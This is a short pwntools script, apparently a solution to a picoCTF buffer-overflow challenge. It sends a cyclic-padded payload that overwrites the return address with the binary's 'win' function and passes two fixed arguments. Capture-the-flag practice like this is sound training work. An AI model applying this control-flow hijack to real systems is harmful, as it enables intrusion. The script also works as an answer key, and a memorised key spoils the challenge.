from pwn import *

# from pprint import pprint

context.update(arch='i386', os='linux') #acquired context from file command

elf = ELF("./vuln")
p = remote("saturn.picoctf.net", 55219) #ports may vary between different instance launched
# p = elf.process()

# pprint(elf.symbols)

#dmesg after running this shows us the IP being overwritten at 0x62616164
# p.sendline(cyclic(150)) 

payload = cyclic(cyclic_find(0x62616164)) #make a payload from the buffer offset   
payload += pack(elf.symbols['win'], endian='little')

payload += cyclic(4) #padding before calling args

#arg1 and arg2
payload += pack(0xCAFEF00D, endian='little')
payload += pack(0xF00DF00D, endian='little')

# print(payload)

p.sendline(payload)

p.interactive()
p.close()